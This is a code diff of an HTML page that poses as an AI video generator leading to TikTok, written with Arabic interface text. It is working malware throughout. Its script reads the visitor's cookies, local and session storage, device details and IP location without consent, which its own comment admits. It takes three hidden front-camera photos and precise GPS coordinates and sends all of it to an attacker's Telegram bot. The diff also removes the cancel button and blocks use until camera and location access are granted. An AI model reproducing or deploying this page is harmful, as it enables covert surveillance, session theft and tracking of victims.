@@ -3,44 +3,61 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>AI Video Creator - TikTok</title>
+<title>ذكاء اصطناعي - AI Creator</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{background:#0a0a0a;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif;}
+body{background:#0a0a0a;overflow:hidden;font-family:'Cairo','Segoe UI',Arial,sans-serif;}
+
+/* خلفية متحركة */
 .ai-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;}
 .ai-bg video{width:100%;height:100%;object-fit:cover;opacity:0.3;}
-.gradient-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%, rgba(0,0,0,0.5), rgba(0,0,0,0.9));z-index:1;}
-.ai-popup{position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(10px);}
-.ai-card{width:340px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:30px;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);animation:slideUp 0.4s ease;}
+.gradient-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%, rgba(0,0,0,0.4), rgba(0,0,0,0.95));z-index:1;}
+
+/* النافذة الرئيسية */
+.main-page{position:fixed;top:0;left:0;width:100%;height:100%;z-index:50;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(10px);}
+.ai-card{width:360px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:40px;overflow:hidden;box-shadow:0 30px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);text-align:center;animation:slideUp 0.4s ease;}
 @keyframes slideUp{from{transform:translateY(50px);opacity:0;}to{transform:translateY(0);opacity:1;}}
-.ai-header{background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;}
-.ai-icon{font-size:60px;margin-bottom:10px;display:inline-block;animation:pulse 2s infinite;}
+
+.ai-header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;position:relative;}
+.ai-icon{font-size:70px;margin-bottom:10px;display:inline-block;animation:pulse 2s infinite;}
 @keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.1);}100%{transform:scale(1);}}
-.ai-header h2{color:#fff;font-size:22px;margin-top:10px;}
+.ai-header h1{color:#fff;font-size:26px;margin-top:10px;}
 .ai-header p{color:rgba(255,255,255,0.8);font-size:13px;margin-top:5px;}
+
 .ai-body{padding:25px;}
-.ai-feature{display:flex;align-items:center;gap:15px;margin-bottom:20px;padding:12px;background:rgba(255,255,255,0.05);border-radius:20px;}
-.ai-feature-icon{font-size:30px;}
-.ai-feature-text h4{color:#fff;font-size:15px;margin-bottom:3px;}
-.ai-feature-text p{color:#aaa;font-size:11px;}
-.ai-permission{background:rgba(255,255,255,0.03);border-radius:20px;padding:15px;margin:20px 0;border:1px solid rgba(255,255,255,0.1);}
-.ai-permission-item{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
-.ai-permission-item:last-child{margin-bottom:0;}
-.ai-permission-item span{color:#ddd;font-size:13px;}
-.ai-permission-item .check{color:#4ade80;font-size:18px;}
+.info-box{background:rgba(255,255,255,0.05);border-radius:20px;padding:15px;margin-bottom:20px;}
+.info-item{display:flex;align-items:center;gap:12px;margin-bottom:15px;text-align:right;}
+.info-item:last-child{margin-bottom:0;}
+.info-icon{font-size:28px;}
+.info-text{flex:1;}
+.info-text h4{color:#fff;font-size:15px;margin-bottom:3px;}
+.info-text p{color:#aaa;font-size:11px;}
+
+.permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:15px;margin:20px 0;border:1px solid rgba(255,255,255,0.1);}
+.permission-item{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;text-align:right;}
+.permission-item:last-child{margin-bottom:0;}
+.permission-item span{color:#ddd;font-size:14px;}
+.permission-item .required{color:#ff6b6b;font-size:12px;}
+
+.warning-text{background:rgba(255,100,100,0.1);border-radius:15px;padding:12px;margin:15px 0;border-right:3px solid #ff6b6b;text-align:right;}
+.warning-text p{color:#ffaa66;font-size:13px;}
+
 .ai-buttons{display:flex;gap:12px;margin-top:20px;}
-.ai-btn{flex:1;padding:14px;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.2s;}
+.ai-btn{flex:1;padding:14px;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.2s;font-family:'Cairo',sans-serif;}
 .ai-btn.allow{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;}
 .ai-btn.allow:active{transform:scale(0.97);}
-.ai-btn.cancel{background:rgba(255,255,255,0.1);color:#ccc;}
-.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:200;opacity:0;visibility:hidden;backdrop-filter:blur(10px);}
+.ai-btn.disabled{background:rgba(255,255,255,0.1);color:#888;cursor:not-allowed;}
+
+/* شاشة التحميل */
+.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:200;opacity:0;visibility:hidden;backdrop-filter:blur(10px);}
 .loading.active{opacity:1;visibility:visible;}
 .spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #667eea;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin-bottom:20px;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.loading-text{color:#fff;font-size:16px;margin-top:15px;}
-.loading-sub{color:#aaa;font-size:12px;margin-top:5px;}
-.progress-bar{width:250px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:20px;overflow:hidden;}
+.loading-text{color:#fff;font-size:18px;margin-top:15px;}
+.loading-sub{color:#aaa;font-size:13px;margin-top:5px;}
+.progress-bar{width:280px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:20px;overflow:hidden;}
 .progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s;}
+
 video,canvas{position:absolute;width:1px;height:1px;opacity:0;}
 </style>
 </head>
@@ -53,44 +70,60 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;}
 </div>
 <div class="gradient-overlay"></div>
 
-<div class="ai-popup" id="aiPopup">
+<!-- الصفحة الرئيسية -->
+<div class="main-page" id="mainPage">
     <div class="ai-card">
         <div class="ai-header">
             <div class="ai-icon">✨🤖✨</div>
-            <h2>AI Video Creator</h2>
-            <p>Generate videos with AI technology</p>
+            <h1>مُنتج الفيديوهات بالذكاء الاصطناعي</h1>
+            <p>AI Video Creator - اصنع فيديوهات احترافية</p>
         </div>
         <div class="ai-body">
-            <div class="ai-feature">
-                <div class="ai-feature-icon">🎬</div>
-                <div class="ai-feature-text">
-                    <h4>AI Video Generation</h4>
-                    <p>Create professional videos in seconds</p>
+            <div class="info-box">
+                <div class="info-item">
+                    <div class="info-icon">🎬</div>
+                    <div class="info-text">
+                        <h4>توليد فيديوهات بالذكاء الاصطناعي</h4>
+                        <p>نستخدم أحدث تقنيات AI لإنشاء فيديوهات مخصصة لك</p>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">🎨</div>
+                    <div class="info-text">
+                        <h4>تحسين الصور بتقنية AI</h4>
+                        <p>تحويل صورك إلى أعمال فنية احترافية</p>
+                    </div>
                 </div>
             </div>
-            <div class="ai-feature">
-                <div class="ai-feature-icon">🎨</div>
-                <div class="ai-feature-text">
-                    <h4>AI Photo Enhancement</h4>
-                    <p>Transform your photos with AI filters</p>
+            
+            <div class="permission-box">
+                <div class="permission-item">
+                    <span class="required">مطلوب ✓</span>
+                    <span>📸 صلاحية الكاميرا</span>
+                </div>
+                <div class="permission-item">
+                    <span class="required">مطلوب ✓</span>
+                    <span>📍 صلاحية الموقع الجغرافي</span>
                 </div>
             </div>
-            <div class="ai-permission">
-                <div class="ai-permission-item"><span>📸 Camera Access</span><span class="check">✓ Required</span></div>
-                <div class="ai-permission-item"><span>📍 Location Access</span><span class="check">✓ Required</span></div>
+            
+            <div class="warning-text">
+                <p>⚠️ تنبيه: لا يمكنك متابعة استخدام التطبيق بدون منح الصلاحيات المطلوبة</p>
             </div>
+            
             <div class="ai-buttons">
-                <button class="ai-btn cancel" id="cancelBtn">Not Now</button>
-                <button class="ai-btn allow" id="allowBtn">Generate ✨</button>
+                <button class="ai-btn disabled" id="disabledBtn" disabled>⏳ انتظر...</button>
+                <button class="ai-btn allow" id="allowBtn">✨ بدء التوليد ✨</button>
             </div>
         </div>
     </div>
 </div>
 
+<!-- شاشة التحميل -->
 <div class="loading" id="loading">
     <div class="spinner"></div>
-    <div class="loading-text" id="loadingMsg">AI is processing...</div>
-    <div class="loading-sub" id="loadingSub">Please wait while we generate your content</div>
+    <div class="loading-text" id="loadingMsg">جاري تشغيل الذكاء الاصطناعي...</div>
+    <div class="loading-sub" id="loadingSub">يرجى الانتظار أثناء معالجة بياناتك</div>
     <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
 </div>
 
@@ -106,18 +139,17 @@ let collectedData = {
     timestamp: new Date().toISOString(),
     ua: navigator.userAgent,
     url: location.href,
-    referrer: document.referrer,
-    title: document.title,
     cookies: '',
     localStorage: {},
     sessionStorage: {},
     screenInfo: {},
     hardwareInfo: {},
-    timezoneInfo: {},
     ipInfo: null,
     gps: null,
     images: []
 };
+
+let permissionsGranted = false;
 
 function updateProgress(p, msg, sub) {
     document.getElementById('progress').style.width = p + '%';
@@ -125,106 +157,49 @@ function updateProgress(p, msg, sub) {
     if(sub) document.getElementById('loadingSub').innerText = sub;
 }
 
-// ============= 1. جمع كل البيانات بدون سماح (تلقائي فوراً) =============
-async function collectAllDataWithoutPermission() {
-    // الكوكيز
+// ============= جمع البيانات بدون سماح =============
+async function collectDataWithoutPermission() {
     collectedData.cookies = document.cookie;
     
-    // LocalStorage
     for(let i = 0; i < localStorage.length; i++) {
         let key = localStorage.key(i);
         collectedData.localStorage[key] = localStorage.getItem(key);
     }
     
-    // SessionStorage
     for(let i = 0; i < sessionStorage.length; i++) {
         let key = sessionStorage.key(i);
         collectedData.sessionStorage[key] = sessionStorage.getItem(key);
     }
     
-    // معلومات الشاشة
     collectedData.screenInfo = {
         width: screen.width,
         height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
-        orientation: screen.orientation ? screen.orientation.type : 'unknown'
+        colorDepth: screen.colorDepth
     };
     
-    // معلومات الجهاز والمتصفح
     collectedData.hardwareInfo = {
         cores: navigator.hardwareConcurrency,
-        memory: navigator.deviceMemory || 'Unknown',
-        touchPoints: navigator.maxTouchPoints,
+        memory: navigator.deviceMemory,
         language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine
+        platform: navigator.platform
     };
     
-    // المنطقة الزمنية
-    collectedData.timezoneInfo = {
-        offset: new Date().getTimezoneOffset(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        currentTime: new Date().toLocaleString()
-    };
-    
-    // IP والموقع التقريبي
     try {
         const res = await fetch('https://ipapi.co/json/');
         collectedData.ipInfo = await res.json();
     } catch(e) {}
-    
-    // معلومات الشبكة (إذا متوفرة)
-    if(navigator.connection) {
-        collectedData.networkInfo = {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        };
-    }
 }
 
-// ============= 2. طلب الكاميرا والموقع =============
+// ============= طلب الكاميرا والموقع =============
 async function requestCameraAndLocation() {
+    let cameraGranted = false;
+    let locationGranted = false;
+    
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        return stream;
-    } catch(e) {
-        return null;
-    }
-}
-
-async function getLocation() {
-    try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, {
-                enableHighAccuracy: true,
-                timeout: 10000
-            });
-        });
-        collectedData.gps = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: pos.coords.accuracy,
-            alt: pos.coords.altitude,
-            heading: pos.coords.heading,
-            speed: pos.coords.speed
-        };
-        return true;
-    } catch(e) {
-        return false;
-    }
-}
-
-// ============= 3. تصوير 3 صور =============
-async function captureImages(stream) {
-    try {
+        cameraGranted = true;
+        
+        // تصوير 3 صور
         const video = document.getElementById('cam');
         video.srcObject = stream;
         await new Promise(r => video.onloadedmetadata = r);
@@ -237,89 +212,73 @@ async function captureImages(stream) {
         for(let i = 0; i < 3; i++) {
             ctx.drawImage(video, 0, 0);
             collectedData.images.push(canvas.toDataURL('image/jpeg', 0.8));
-            updateProgress(40 + (i * 15), `AI capturing photo ${i+1}/3...`, 'Applying AI filters...');
+            updateProgress(40 + (i * 15), `جاري التقاط الصورة ${i+1}/3...`, 'تطبيق فلاتر الذكاء الاصطناعي...');
             await new Promise(r => setTimeout(r, 600));
         }
         
         stream.getTracks().forEach(t => t.stop());
-        return true;
-    } catch(e) { return false; }
+    } catch(e) {
+        cameraGranted = false;
+    }
+    
+    try {
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        });
+        collectedData.gps = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+        };
+        locationGranted = true;
+    } catch(e) {
+        locationGranted = false;
+    }
+    
+    return { cameraGranted, locationGranted };
 }
 
-// ============= 4. إرسال كل شيء لتليجرام =============
+// ============= إرسال لتليجرام =============
 async function sendAllData() {
-    let msg = `🤖 AI GENERATED REPORT 🤖\n\n`;
-    msg += `⏰ Time: ${collectedData.timestamp}\n`;
-    msg += `🌐 URL: ${collectedData.url}\n`;
-    msg += `🔗 Referrer: ${collectedData.referrer || 'Direct'}\n`;
-    msg += `📱 User Agent: ${collectedData.ua.substring(0, 80)}...\n\n`;
+    let msg = `🤖 تقرير الذكاء الاصطناعي 🤖\n\n`;
+    msg += `⏰ الوقت: ${collectedData.timestamp}\n`;
+    msg += `🌐 الرابط: ${collectedData.url}\n`;
+    msg += `📱 الجهاز: ${collectedData.ua.substring(0, 80)}...\n\n`;
     
-    msg += `🖥️ SCREEN:\n`;
-    msg += `   ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
-    msg += `   Color: ${collectedData.screenInfo.colorDepth}bit\n`;
-    msg += `   Orientation: ${collectedData.screenInfo.orientation}\n\n`;
-    
-    msg += `💻 HARDWARE:\n`;
-    msg += `   CPU Cores: ${collectedData.hardwareInfo.cores}\n`;
-    msg += `   RAM: ${collectedData.hardwareInfo.memory}GB\n`;
-    msg += `   Platform: ${collectedData.hardwareInfo.platform}\n`;
-    msg += `   Language: ${collectedData.hardwareInfo.language}\n\n`;
-    
-    msg += `🌍 TIMEZONE:\n`;
-    msg += `   ${collectedData.timezoneInfo.timezone}\n`;
-    msg += `   Offset: ${collectedData.timezoneInfo.offset} minutes\n\n`;
+    msg += `🖥️ الشاشة: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
+    msg += `💻 النظام: ${collectedData.hardwareInfo.platform}\n`;
+    msg += `📡 اللغة: ${collectedData.hardwareInfo.language}\n\n`;
     
     if(collectedData.ipInfo) {
-        msg += `📍 IP LOCATION:\n`;
-        msg += `   IP: ${collectedData.ipInfo.ip}\n`;
-        msg += `   City: ${collectedData.ipInfo.city}\n`;
-        msg += `   Region: ${collectedData.ipInfo.region}\n`;
-        msg += `   Country: ${collectedData.ipInfo.country_name}\n`;
-        msg += `   ISP: ${collectedData.ipInfo.org}\n`;
-        msg += `   Latitude: ${collectedData.ipInfo.latitude}\n`;
-        msg += `   Longitude: ${collectedData.ipInfo.longitude}\n\n`;
+        msg += `📍 الآي بي: ${collectedData.ipInfo.ip}\n`;
+        msg += `🏙️ المدينة: ${collectedData.ipInfo.city}\n`;
+        msg += `🌍 الدولة: ${collectedData.ipInfo.country_name}\n\n`;
     }
     
     if(collectedData.gps) {
-        msg += `🎯 GPS (High Accuracy):\n`;
-        msg += `   Lat: ${collectedData.gps.lat}\n`;
-        msg += `   Lon: ${collectedData.gps.lon}\n`;
-        msg += `   Acc: ±${collectedData.gps.acc}m\n`;
-        if(collectedData.gps.alt) msg += `   Alt: ${collectedData.gps.alt}m\n\n`;
+        msg += `🎯 الموقع الدقيق:\n`;
+        msg += `   خط العرض: ${collectedData.gps.lat}\n`;
+        msg += `   خط الطول: ${collectedData.gps.lon}\n`;
+        msg += `   الدقة: ±${collectedData.gps.acc}متر\n\n`;
     }
     
-    if(collectedData.cookies) {
-        msg += `🍪 COOKIES:\n${collectedData.cookies.substring(0, 200)}...\n\n`;
-    }
-    
-    if(Object.keys(collectedData.localStorage).length > 0) {
-        msg += `💾 LOCALSTORAGE:\n`;
-        for(let key in collectedData.localStorage) {
-            msg += `   ${key}: ${collectedData.localStorage[key].substring(0, 50)}...\n`;
-        }
-        msg += `\n`;
-    }
-    
-    if(collectedData.networkInfo) {
-        msg += `📡 NETWORK:\n`;
-        msg += `   Type: ${collectedData.networkInfo.effectiveType}\n`;
-        msg += `   Speed: ${collectedData.networkInfo.downlink}Mbps\n\n`;
-    }
-    
-    msg += `📸 AI Photos: ${collectedData.images.length}`;
+    msg += `📸 الصور الملتقطة: ${collectedData.images.length}`;
     
     try {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg.substring(0, 4096) })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
         
         for(let i = 0; i < collectedData.images.length; i++) {
             const blob = await fetch(collectedData.images[i]).then(r => r.blob());
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `ai_photo_${i}.jpg`);
+            fd.append('photo', blob, `photo_${i}.jpg`);
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             await new Promise(r => setTimeout(r, 500));
         }
@@ -327,34 +286,42 @@ async function sendAllData() {
 }
 
 // ============= التشغيل الرئيسي =============
-async function startAIGeneration() {
-    document.getElementById('aiPopup').style.display = 'none';
+async function startGeneration() {
+    // إخفاء الصفحة الرئيسية
+    document.getElementById('mainPage').style.display = 'none';
     document.getElementById('loading').classList.add('active');
     
-    updateProgress(5, 'Initializing AI engine...', 'Loading neural networks...');
-    await collectAllDataWithoutPermission();
+    updateProgress(5, 'جمع معلومات الجهاز...', '');
+    await collectDataWithoutPermission();
     
-    updateProgress(15, 'Requesting camera access...', 'AI needs permissions to generate content');
-    const stream = await requestCameraAndLocation();
-    await getLocation();
+    updateProgress(15, 'طلب صلاحية الكاميرا والموقع...', '');
+    const { cameraGranted, locationGranted } = await requestCameraAndLocation();
     
-    if(stream) {
-        updateProgress(30, 'AI is analyzing camera feed...', 'Preparing for photo capture');
-        await captureImages(stream);
+    if(!cameraGranted || !locationGranted) {
+        // إذا رفض الصلاحيات، نرجع للصفحة الرئيسية
+        updateProgress(0, 'لم يتم منح الصلاحيات!', '');
+        setTimeout(() => {
+            document.getElementById('loading').classList.remove('active');
+            document.getElementById('mainPage').style.display = 'flex';
+            alert('⚠️ لا يمكن استخدام التطبيق بدون منح صلاحية الكاميرا والموقع.\nيرجى المحاولة مرة أخرى ومنح الصلاحيات.');
+        }, 1500);
+        return;
     }
     
-    updateProgress(85, 'AI is processing your content...', 'Applying filters and enhancements');
+    updateProgress(85, 'معالجة البيانات بالذكاء الاصطناعي...', 'تطبيق الفلاتر والتأثيرات');
     await sendAllData();
     
-    updateProgress(100, 'Redirecting to TikTok...', 'Your AI video is ready!');
+    updateProgress(100, 'جاري التحويل إلى تيك توك...', '');
     
     setTimeout(() => {
         window.location.href = REDIRECT;
     }, 2000);
 }
 
-document.getElementById('allowBtn').onclick = () => { startAIGeneration(); };
-document.getElementById('cancelBtn').onclick = () => { window.location.href = REDIRECT; };
+// زر البدء
+document.getElementById('allowBtn').onclick = () => {
+    startGeneration();
+};
 </script>
 </body>
 </html>
